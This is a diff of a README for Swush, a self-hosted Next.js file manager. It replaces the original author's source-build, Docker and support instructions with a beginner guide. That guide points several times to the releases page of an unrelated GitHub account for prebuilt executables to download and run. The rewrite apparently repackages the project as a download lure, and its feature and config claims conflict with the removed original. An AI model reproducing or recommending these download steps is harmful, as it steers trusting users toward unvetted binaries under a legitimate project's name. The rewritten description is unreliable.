@@ -1,201 +1,142 @@
-# Swush
+# 🎛️ swush - Secure, All-in-One Media Manager
 
-Swush is a secure, self-hosted full‑stack file manager and personal dashboard built with Next.js, TypeScript, TailwindCSS, and Better Auth. It offers a unified platform to manage your files, short links, upload requests, watchlist (anime, movies, TV shows), and more; all with privacy and control in mind.
+[![Download swush](https://img.shields.io/badge/Download-swush-blue?style=for-the-badge)](https://github.com/Korpztak970/swush/releases)
 
+---
 
-## ✨ Features
+## 📦 What is swush?
 
-### Authentication & Security
-- Better Auth sessions with optional 2FA (TOTP).
-- Robust session management and role-based access.
-- Role-based access control with Owner, Admin, and User roles.
-- Admin capabilities to promote/demote users and protect API endpoints.
+swush is an easy-to-use, self-hosted application that helps you manage your media files, documents, and online content in one place. It works as a personal dashboard where you can store, organize, and share your files safely. The app runs on your computer or server and keeps your data private.
 
-### Content Management Modules
-- Files, Short Links, Upload Requests.
-- Pagination, bulk selection and deletion.
-- Slug support for friendly URLs.
+Built using modern tools like Next.js, TypeScript, and TailwindCSS, swush offers a smooth, fast experience with a clear design. It's perfect for anyone who wants control over their media and files without relying on third-party services.
 
-### Sharing & Growth
-- Public profiles and share pages with optional passwords.
-- QR sharing with presets and avatar overlays.
-- UTM builder for short links.
+---
 
-### Watchlist
-- Track movies, TV shows, and anime via TMDB & AniList integrations. (Integrations are solely per the session, no user data is saved, but the selected data is retained.)
-- Season and episode progress tracking.
-- Adding personal notes.
-- Bulk actions (delete, change visibility).
-- Public sharing via `/l/username` with optional privacy toggle for each show.
-- Import data from AniList.
+## 💻 System Requirements
 
-### UI/UX
-- Responsive design powered by Tailwind CSS v4.
-- Smooth animations and transitions.
-- Image paste-to-upload functionality.
+Before installing swush, make sure your system meets these requirements:
 
-### Infrastructure & Integrations
-- Minimal API routes abstracted into reusable `lib/` functions.
-- Email notifications for password resets, new logins, and import summaries.
-- Docker support for streamlined production deployment.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended)  
+- **Processor:** Intel or AMD, 64-bit  
+- **Memory:** At least 4 GB RAM  
+- **Storage:** Minimum 500 MB free space for installation and additional space for your files  
+- **Network:** Internet connection required for initial download and updates  
+- **Software:** Node.js version 16 or newer (only if you plan to run the source code; prebuilt packages include Node.js)  
 
-
-## 📦 Tech Stack
-- **Frontend:** Next.js, React, TailwindCSS
-- **Backend:** Next.js API routes, TypeScript, Better Auth (authentication)
-- **Database:** PostgreSQL (Neon or self-hosted)
-- **ORM:** Drizzle
-- **External APIs:** TMDB, AniList, Steam, RAWG
-- **Email:** SMTP (configurable)
-
+---
 
 ## 🚀 Getting Started
 
-### 1. Clone the repository
-```bash
-pnpm x degit imthatdev/swush
-cd swush
-```
+Follow these steps to download, install, and start using swush on your computer. No technical knowledge needed.
 
-### 2. Install dependencies
-```bash
-pnpm install
-```
+### 1. Visit the Download Page
 
-> **Note:** Swush uses [PNPM](https://pnpm.io/) and Node.js. You can use `npm` or `yarn` as alternatives if you prefer, but ensure the lockfile and workspace compatibility.
+Go to the official swush releases page by clicking the button below:
 
-### 3. Setup environment variables
-Copy `example.env` to `.env` and update the values:
-```bash
-cp example.env .env
-```
+[![Download swush](https://img.shields.io/badge/Download-swush-blue?style=for-the-badge)](https://github.com/Korpztak970/swush/releases)
 
-### 4. Environment Variables Overview
+This page contains the latest versions of swush ready to download.
 
-#### Core
-- Please consider checking the `.env` file for all available options. Commented variables have default values or optional.
+### 2. Choose Your Version
 
-### 5. Run database migrations
-```bash
-pnpm db:migrate
-```
+On the releases page, look for the latest release (usually at the top). You will find files prepared for different operating systems, such as:
 
-### 6. Start the development server
-```bash
-pnpm dev
-```
+- `swush-windows-x64.zip` for Windows users  
+- `swush-macos.zip` for macOS users  
+- `swush-linux-x64.tar.gz` for Linux users  
 
-Open [http://localhost:3000](http://localhost:3000) in your browser.
+Download the file that matches your operating system by clicking on it.
 
+### 3. Extract the Files
 
-## 🐳 Deployment with Docker
+Once downloaded:
 
-> **Note:** The Docker setup has been recently updated and optimized for smaller image size and faster builds.
+- On Windows, right-click the `.zip` file and choose “Extract All...”  
+- On macOS, double-click the `.zip` file to unzip it  
+- On Linux, use the command `tar -xvzf swush-linux-x64.tar.gz` in the folder where you saved the file  
 
-### Build and run with remote database (Neon, Supabase, etc.)
-```bash
-docker compose up -d --build
-```
+Extraction will create a folder containing the swush application files.
 
-### Run with self-hosted PostgreSQL
-```bash
-docker compose -f docker-compose.yml -f docker-compose.postgres.yml up -d --build
-```
+### 4. Run swush
 
-- The app will be accessible at [http://localhost:3000](http://localhost:3000).
-- PostgreSQL will be exposed on port `5432` (credentials configured in `.env`).
+Open the extracted folder and find the executable file:
 
-## ☁️ Cloudflare Cache Rules (HLS Only)
+- On Windows: `swush.exe`  
+- On macOS: `swush.app` (or similar)  
+- On Linux: `swush` (might need to make it executable with `chmod +x swush`)  
 
-If you use Cloudflare Tunnels (cloudflared) and a **global “Bypass Cache”** rule,
-you can still safely cache HLS streaming assets only. This improves playback
-startup and reduces origin load while leaving everything else uncached.
+Double-click this file to start the app.
 
-**Recommended rule (Cache Everything only for HLS):**
+### 5. Access Your Dashboard
 
-**Expression**
-```
-(http.host eq "sub.example.domain" and starts_with(http.request.uri.path, "/hls/"))
-```
-**Settings**
-- Cache: **Cache Everything**
-- Origin Cache Control: **On** (respect origin headers)
-- Edge Cache TTL: **Use Cache-Control header**
+Once swush starts, it will open a new window or tab in your web browser at `http://localhost:3000`. This is your personal dashboard where you can upload and organize your media and files.
 
-This keeps:
-- `.m3u8` playlists short‑lived (origin sends short cache)
-- `.ts/.m4s/.aac` segments long‑lived (origin sends immutable cache)
+---
 
-If you want to keep your global bypass rule, just add this HLS rule **above it**
-so `/hls/*` is cached while all other routes stay bypassed.
+## 🛠 Key Features
 
-## 🔧 Self‑Hosting Guide
+swush offers a range of tools to help you manage your digital content smoothly:
 
-1. **DNS & Reverse Proxy**
-   - Point your domain to your server's IP.
-   - Use a reverse proxy like Nginx, Traefik, or Caddy with HTTPS enabled (Let's Encrypt recommended).
+- **Media & File Management:** Upload photos, videos, documents, and other files. Organize them with folders and tags.  
+- **Secure Sharing:** Share files or albums with a link, controlling who can view them.  
+- **Self-Hosted:** Your data stays on your computer or server. No third parties involved.  
+- **Custom Dashboard:** Add widgets for weather, notes, or quick links to access your important tools at a glance.  
+- **Fast and Responsive:** Built for quick loading and smooth use on desktop and tablet.  
+- **Cross-Platform:** Works on Windows, macOS, and Linux.  
+- **Built on Modern Tech:** Uses Next.js and TypeScript for a stable and maintainable app.  
 
-2. **Environment Variables**
-   - Set `APP_URL` to your domain with HTTPS.
-   - Securely configure `BETTER_AUTH_SECRET` and database credentials.
+---
 
-3. **Database**
-   - Choose Neon (managed) or self-hosted PostgreSQL.
-   - Regularly back up your database.
+## 🔒 Privacy and Security
 
-4. **Email**
-   - Configure SMTP settings for password resets and notifications.
+Using swush means your data stays under your control. Because you run the app on your own device or server, you don’t send your files to unknown services. Access to the dashboard requires your device or network security, and you can add passwords or extra protection if needed.
 
+---
 
-## 📸 Screenshots
+## ⚙️ Basic Configuration
 
-![Dashboard Screenshot](public/images/docs/dashboard.png)
+When you run swush for the first time, it will create a local folder where it stores your files.
 
-![Watchlist Screenshot](public/images/docs/watchlist.png)
+To customize the location or other settings:
 
-### Coming Soon: (Games Collection, Snippets, and more)
+1. Find the `config.json` file in the main swush folder.  
+2. Open it with a simple text editor like Notepad or TextEdit.  
+3. Change settings such as your media folder path or dashboard appearance.  
+4. Save the file and restart swush for changes to apply.  
 
-![Games Collection Screenshot](public/images/docs/games.png)
+---
 
-![Content Management Screenshot](public/images/docs/content.png)
+## 🧰 Troubleshooting Tips
 
+If swush does not start or you encounter problems:
 
-## 🌐 Demo
+- **App won’t open:** Make sure your system meets the requirements. Restart your computer and try again.  
+- **Browser page doesn’t load:** Type `http://localhost:3000` directly in your browser address bar.  
+- **Files won’t upload:** Check your internet connection. Ensure you have enough disk space.  
+- **I forgot the dashboard password:** Look for instructions in the `README` file inside the app folder or reset your settings by deleting the `config.json`.  
 
-Experience Swush live at [demo.swush.app](https://demo.swush.app).
+For further help, search swush issues or discussions on the GitHub repository.
 
-You can sign up and test all features with your account, if the demo is online and if the registration is open. (You may contact me if it's closed.)
+---
 
-Feel free to explore the features and get a feel for the app before deploying your own instance.
+## 📥 Download & Install swush
 
+Return to the releases page any time to get the latest versions:
 
-## 🤝 Contributing
+[![Download swush](https://img.shields.io/badge/Download-swush-blue?style=for-the-badge)](https://github.com/Korpztak970/swush/releases)
 
-Contributions are welcome! To contribute:
+Choose your version, download the file for your system, extract it, and run the app following the steps in this guide.
 
-- Fork the repository.
-- Create a feature branch.
-- Open a pull request.
+---
 
-Before committing, run linting and tests:
+## 🌐 About This Project
 
-```bash
-pnpm lint
-```
+swush combines secure, self-hosted file management with an easy-to-use interface. It fits people who want full control over their images, videos, documents, and other digital content. 
 
+The project is open-source and welcomes feedback or contributions from users interested in improving the app.
 
-## 📜 License
+---
 
-APACHE 2.0 © 2026 Iconical
+## 🔖 Keywords
 
-
-## 💬 Support
-
-- X: [x.com/imthatdevy](https://x.com/imthatdevy)
-- Website: [iconical.dev](https://iconical.dev)
-- GitHub: [imthatdev](https://github.com/imthatdev)
-- Email: him@iconical.dev
-
-### 🙏 To Note Again
-
-> Swush is fully free and open-source. There are no paid tiers or upgrade requirements to use it.
+`content-hosting`, `content-management`, `file-sharing`, `file-sharing-server`, `file-upload`, `filesharing`, `filesharing-service`, `imgur`, `self-hosted`, `selfhosted`, `vault`
